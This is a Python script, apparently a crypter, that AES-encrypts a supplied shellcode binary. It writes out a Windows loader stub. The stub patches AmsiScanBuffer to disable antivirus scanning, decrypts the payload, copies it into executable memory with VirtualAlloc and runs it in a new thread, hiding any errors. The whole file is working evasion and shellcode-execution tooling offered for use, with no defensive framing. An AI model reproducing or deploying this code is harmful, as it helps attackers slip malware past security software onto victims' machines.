import sys
import base64
import ctypes
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes

if len(sys.argv) != 3:
    print(f"Uso: python {sys.argv[0]} <payload_bin> <output>")
    sys.exit(1)

input_bin = sys.argv[1]
output_stub = sys.argv[2]

try:
    with open(input_bin, "rb") as f:
        bin_bytes = f.read()
except FileNotFoundError:
    print(f"[-] Erro: Arquivo '{input_bin}' não encontrado")
    sys.exit(1)

AES_KEY = get_random_bytes(16)
IV = get_random_bytes(16)

cipher = AES.new(AES_KEY, AES.MODE_CBC, IV)
encrypted_bin = cipher.encrypt(pad(bin_bytes, AES.block_size))
encrypted_b64 = base64.b64encode(encrypted_bin).decode()
key_b64 = base64.b64encode(AES_KEY).decode()
iv_b64 = base64.b64encode(IV).decode()

stub = f"""
import ctypes
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

encrypted_payload = "{encrypted_b64}"
AES_KEY = base64.b64decode("{key_b64}")
IV = base64.b64decode("{iv_b64}")

MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40
INFINITE = -1

kernel32 = ctypes.windll.kernel32
kernel32.VirtualAlloc.restype = ctypes.c_void_p
kernel32.RtlMoveMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t]
kernel32.CreateThread.restype = ctypes.c_void_p
kernel32.CreateThread.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_ulong, ctypes.c_void_p]
kernel32.WaitForSingleObject.argtypes = [ctypes.c_void_p, ctypes.c_ulong]

def amsi_bypass():
    handle = kernel32.GetModuleHandleW("amsi.dll")
    if not handle:
        return
    addr = kernel32.GetProcAddress(handle, b"AmsiScanBuffer")
    if not addr:
        return
    patch = b"\\x48\\x31\\xC0\\xC3"  # xor rax, rax; ret
    old_protect = ctypes.c_ulong()
    kernel32.VirtualProtect(addr, len(patch), 0x40, ctypes.byref(old_protect))
    ctypes.memmove(addr, patch, len(patch))
    kernel32.VirtualProtect(addr, len(patch), old_protect.value, ctypes.byref(ctypes.c_ulong()))

def decrypt_payload(enc_payload, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted_bytes = base64.b64decode(enc_payload)
    return unpad(cipher.decrypt(encrypted_bytes), AES.block_size)

def execute_payload(payload):
    ptr = kernel32.VirtualAlloc(None, len(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if not ptr:
        return
    buf = ctypes.create_string_buffer(payload)
    kernel32.RtlMoveMemory(ptr, buf, len(payload))
    handle = kernel32.CreateThread(None, 0, ptr, None, 0, None)
    if handle:
        kernel32.WaitForSingleObject(handle, INFINITE)

if __name__ == "__main__":
    try:
        amsi_bypass()  # desativa AMSI primeiro
        decrypted = decrypt_payload(encrypted_payload, AES_KEY, IV)
        execute_payload(decrypted)
    except Exception:
        pass
"""

with open(output_stub, "w", encoding="utf-8") as f:
    f.write(stub)

print(f"[+] Stub gerado com sucesso: {output_stub}")
